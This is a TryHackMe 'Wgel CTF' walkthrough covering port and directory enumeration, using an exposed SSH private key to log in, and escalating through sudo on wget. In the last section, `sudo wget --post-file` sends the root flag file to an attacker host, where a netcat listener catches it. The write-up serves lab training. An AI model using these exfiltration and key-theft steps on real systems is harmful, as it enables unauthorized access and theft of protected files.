# TRYHACKME : Wgel CTF

# ENUMERATION
## NMAP 
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 94:96:1b:66:80:1b:76:48:68:2d:14:b5:9a:01:aa:aa (RSA)
|   256 18:f7:10:cc:5f:40:f6:cf:92:f8:69:16:e2:48:f4:38 (ECDSA)
|_  256 b9:0b:97:2e:45:9b:f3:2a:4b:11:c7:83:10:33:e0:ce (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## GOBUSTER
```
/.htpasswd            (Status: 403) [Size: 276]
/.hta                 (Status: 403) [Size: 276]
/.htaccess            (Status: 403) [Size: 276]
/index.html           (Status: 200) [Size: 11374]
/server-status        (Status: 403) [Size: 276]
/sitemap              (Status: 301) [Size: 312] [--> http://10.10.19.88/sitemap/]    
```

## GOBUSTER /sitemap
```
/.html                (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/.htaccess.js         (Status: 403) [Size: 277]
/.hta.js              (Status: 403) [Size: 277]
/.htpasswd.html       (Status: 403) [Size: 277]
/.ssh                 (Status: 301) [Size: 319] [--> http://10.10.146.32/sitemap/.ssh/]
/.htpasswd.php        (Status: 403) [Size: 277]
/.hta.html            (Status: 403) [Size: 277]
/.htaccess.php        (Status: 403) [Size: 277]
/.hta.php             (Status: 403) [Size: 277]
/.htaccess.html       (Status: 403) [Size: 277]
/.hta                 (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/.htpasswd.js         (Status: 403) [Size: 277]
/about.html           (Status: 200) [Size: 12232]
/blog.html            (Status: 200) [Size: 12745]
/contact.html         (Status: 200) [Size: 10346]
/css                  (Status: 301) [Size: 318] [--> http://10.10.146.32/sitemap/css/]
/fonts                (Status: 301) [Size: 320] [--> http://10.10.146.32/sitemap/fonts/]
/images               (Status: 301) [Size: 321] [--> http://10.10.146.32/sitemap/images/]
/index.html           (Status: 200) [Size: 21080]
/index.html           (Status: 200) [Size: 21080]
/js                   (Status: 301) [Size: 317] [--> http://10.10.146.32/sitemap/js/]
/services.html        (Status: 200) [Size: 10131]
/shop.html            (Status: 200) [Size: 17257]
/work.html            (Status: 200) [Size: 11428]
```

## FIND ACCESS

Out of all the directories, the most suspicious is definitely the `/.ssh` one. You'll find an rsa id. Will be useful so im going to get a local copy.
```
$ wget http://[TARGET-IP]/sitemap/.ssh/id_rsa
$ chmod 600 id_rsa
```

> Now we just need to find a credential.

> Lurking around the `/sitemap` directory and its directories doesn't really have any valid credential. I tried to go back from the root directory and found a comment with a credential asking to update the website.

> Let's now get in the SSH

```
$ ssh -i id_rsa [CREDENTIAL]@[TARGET-IP]
```
> Then retrieve the user flag found in the `Documents/` directory

## PRIVILEGE ESCALATION

Now let's find a way to escalate.

I tried `sudo -l` and fortunately we found two possible entry:
```
[CREDENTIAL]@CorpOne:~$ sudo -l
Matching Defaults entries for [CREDENTIAL] on CorpOne:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
LFILE=file_to_read
wget -i $LFILE
User [CREDENTIAL] may run the following commands on CorpOne:
    (ALL : ALL) ALL
    (root) NOPASSWD: /usr/bin/wget
```

We can go for the easy way which to use `wget` and upload the root flag to our local file.
### TARGET MACHINE
```
[CREDENTIAL]@CorpOne:/tmp$ sudo wget --post-file=/root/root_flag.txt [ATTACKER-IP]
--2025-04-30 10:00:53--  http://[ATTACKER-IP]/
Connecting to [ATTACKER-IP]:80... connected.
HTTP request sent, awaiting response... 200 No headers, assuming HTTP/0.9
Length: unspecified
Saving to: ‘index.html’

index.html            [ <=>        ]       1  --.-KB/s               Connection to 10.10.36.108 closed by remote host.
Connection to 10.10.36.108 closed.

```

### LOCAL MACHINE
```
$ nc -lvp 80 >root.txt
listening on [any] 80 ...
10.10.36.108: inverse host lookup failed: Unknown host
connect to [[ATTACKER-IP]] from (UNKNOWN) [10.10.36.108] 43318

└─$ ls          
id_rsa.1  root.txt  wgetctf
                                                                      
└─$ cat root.txt             
POST / HTTP/1.1
User-Agent: Wget/1.17.1 (linux-gnu)
Accept: */*
Accept-Encoding: identity
Host: [ATTACKER-IP]
Connection: Keep-Alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 33

[RETRIEVE FLAG]

```






